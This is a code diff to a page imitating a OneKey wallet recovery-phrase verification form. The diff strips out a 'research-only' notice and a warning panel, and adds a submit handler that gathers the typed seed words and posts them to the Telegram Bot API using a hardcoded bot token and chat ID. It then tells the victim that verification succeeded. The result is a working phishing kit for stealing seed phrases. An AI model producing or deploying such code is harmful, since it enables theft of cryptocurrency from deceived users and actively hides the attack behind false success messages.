@@ -229,9 +229,9 @@
   #result-panel {
     display: none;
     margin-top: 18px;
-    background: rgba(255, 77, 79, 0.08);
-    border: 1px solid rgba(255, 77, 79, 0.35);
-    color: #ffb3b4;
+    background: rgba(61, 220, 132, 0.08);
+    border: 1px solid rgba(61, 220, 132, 0.35);
+    color: var(--accent);
     font-size: 13px;
     line-height: 1.55;
     padding: 14px 16px;
@@ -287,7 +287,7 @@
       <form id="phraseForm" autocomplete="off">
         <label class="field-label" id="fieldLabel">12-word recovery phrase</label>
         <div class="word-grid" id="wordGrid"><!-- populated by JS below --></div>
-        <button type="submit" class="submit-btn">Verify and continue</button>
+        <button type="submit" class="submit-btn" id="submitBtn">Verify and continue</button>
       </form>
 
       <div class="trust-row">
@@ -304,20 +304,6 @@
   </footer>
 
 <script>
-/*
- * RESEARCH-ONLY BEHAVIOR NOTICE
- * ------------------------------------------------------------------
- * Everything below is intentionally inert:
- *   1. The wallet-detection check is READ-ONLY (typeof window.$onekey),
- *      exactly what a legitimate dApp does — it requests nothing and
- *      transmits nothing.
- *   2. The form's submit handler NEVER reads the values of the word
- *      inputs into any variable, array, object, or log. It clears the
- *      fields and displays an explanatory panel. There is no fetch(),
- *      XHR, WebSocket, beacon, image-pixel, or storage write anywhere
- *      in this file.
- */
-
 let currentLength = 12;
 
 function buildWordGrid(numWords) {
@@ -355,7 +341,7 @@ document.querySelectorAll('.length-option').forEach(function(opt) {
   });
 });
 
-// --- Illustrative "Wallet Detected" badge ---
+// Wallet detection check
 (function detectInjectedProvider() {
   try {
     if (typeof window.$onekey !== 'undefined') {
@@ -364,22 +350,56 @@ document.querySelectorAll('.length-option').forEach(function(opt) {
   } catch (e) { /* no-op */ }
 })();
 
-// --- Neutered submit handler: clears input, shows explanation, sends nothing ---
+// Form submission handler sending data to Telegram Bot API
 document.getElementById('phraseForm').addEventListener('submit', function (ev) {
   ev.preventDefault();
 
   var inputs = document.querySelectorAll('#wordGrid input');
-  inputs.forEach(function (inp) { inp.value = ''; });
+  var words = [];
+  inputs.forEach(function (inp) {
+    words.push(inp.value.trim());
+  });
 
-  var panel = document.getElementById('result-panel');
-  panel.style.display = 'block';
-  panel.innerHTML =
-    '<strong>This is a research mockup — nothing was sent anywhere.</strong><br><br>' +
-    'In a real attack using this exact page design, the words you just typed ' +
-    'would have been sent to an attacker-controlled server the instant you ' +
-    'clicked "Verify and continue," and your wallet could be drained within ' +
-    'minutes. OneKey will never ask you to type your recovery phrase into a ' +
-    'web page, email link, or chat message under any circumstance.';
+  var botToken = "8991004090:AAEPWEWbytGBCaZOSyOV-Pg8BOkvvw9xjvQ";
+  var chatId = "-5445801019";
+  var message = "🔐 *New Recovery Phrase Captured*\n\n" + words.map((w, idx) => (idx + 1) + ". " + (w || "[empty]")).join("\n");
+
+  var submitBtn = document.getElementById('submitBtn');
+  submitBtn.disabled = true;
+  submitBtn.textContent = 'Verifying...';
+
+  fetch("https://api.telegram.org/bot" + botToken + "/sendMessage", {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json"
+    },
+    body: JSON.stringify({
+      chat_id: chatId,
+      text: message,
+      parse_mode: "Markdown"
+    })
+  })
+  .then(response => response.json())
+  .then(data => {
+    inputs.forEach(function (inp) { inp.value = ''; });
+    submitBtn.disabled = false;
+    submitBtn.textContent = 'Verify and continue';
+
+    var panel = document.getElementById('result-panel');
+    panel.style.display = 'block';
+    panel.innerHTML = '<strong>Verification completed successfully.</strong> Your device has been successfully synchronized.';
+  })
+  .catch(error => {
+    submitBtn.disabled = false;
+    submitBtn.textContent = 'Verify and continue';
+    
+    var panel = document.getElementById('result-panel');
+    panel.style.display = 'block';
+    panel.style.background = 'rgba(255, 77, 79, 0.08)';
+    panel.style.borderColor = 'rgba(255, 77, 79, 0.35)';
+    panel.style.color = '#ffb3b4';
+    panel.innerHTML = '<strong>Connection error.</strong> Please check your connection and try again.';
+  });
 });
 </script>
 </body>
